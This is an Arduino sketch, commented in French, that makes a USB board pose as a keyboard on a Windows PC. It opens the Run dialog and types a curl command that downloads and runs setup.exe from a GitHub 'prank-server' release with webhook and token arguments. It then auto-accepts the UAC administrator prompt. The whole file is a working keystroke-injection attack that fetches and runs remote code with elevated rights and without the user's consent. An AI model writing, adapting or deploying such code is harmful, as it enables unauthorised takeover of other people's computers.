#include <Keyboard.h>

// ─── A configurer avant de flasher ───────────────────────────────────────────
#define WEBHOOK   "VOTRE_WEBHOOK_ICI"
#define TOKEN     "VOTRE_TOKEN_ICI"
#define SETUP_URL "https://github.com/lamziiii/prank-server/releases/latest/download/setup.exe"

// Delai avant que Windows reconnaisse l'Arduino comme clavier (ms)
#define BOOT_DELAY  3500

// Delai apres la commande avant d'accepter l'UAC (ajuster selon vitesse reseau)
// 8000ms = ok pour connexion rapide, monter a 15000 si le reseau est lent
#define UAC_DELAY   8000

// Touche UAC : 'o' = Oui (Windows FR/AZERTY), 'y' = Yes (Windows EN/QWERTY)
#define UAC_KEY     'o'
// ─────────────────────────────────────────────────────────────────────────────

void pressKey(uint8_t modifier, uint8_t key) {
  if (modifier) Keyboard.press(modifier);
  Keyboard.press(key);
  delay(80);
  Keyboard.releaseAll();
  delay(60);
}

void switchToQwerty() {
  // Alt+Shift bascule vers le layout suivant (generalement EN-QWERTY sur Windows FR).
  // Necessite qu'Anglais soit installe comme langue supplementaire dans Windows
  // (c'est le cas par defaut sur la plupart des Windows FR).
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(KEY_LEFT_SHIFT);
  delay(100);
  Keyboard.releaseAll();
  delay(600); // Laisser Windows appliquer le changement
}

void setup() {
  delay(BOOT_DELAY);
  Keyboard.begin();

  // Forcer le layout QWERTY avant de taper pour que les caracteres speciaux
  // (\ % " &) soient correctement interpretes quel que soit le layout par defaut
  switchToQwerty();

  // Ouvrir la boite Executer (Win+R)
  pressKey(KEY_LEFT_GUI, 'r');
  delay(900);

  // Telecharger setup.exe depuis GitHub Releases et le lancer avec les credentials
  // Le setup.exe a un manifest requireAdministrator : il declenchera l'UAC lui-meme
  Keyboard.print("cmd /c curl -sLo %TEMP%\\s.exe ");
  Keyboard.print(SETUP_URL);
  Keyboard.print(" && %TEMP%\\s.exe -w \"");
  Keyboard.print(WEBHOOK);
  Keyboard.print("\" -t \"");
  Keyboard.print(TOKEN);
  Keyboard.print("\"");
  delay(100);
  pressKey(0, KEY_RETURN);

  // Restaurer le layout d'origine (Alt+Shift en sens inverse)
  switchToQwerty();

  // Attendre : ouverture cmd + telechargement setup.exe + apparition UAC
  delay(UAC_DELAY);

  // Accepter l'UAC via le raccourci clavier Alt+O (FR) ou Alt+Y (EN)
  pressKey(KEY_LEFT_ALT, UAC_KEY);

  Keyboard.end();
}

void loop() {}
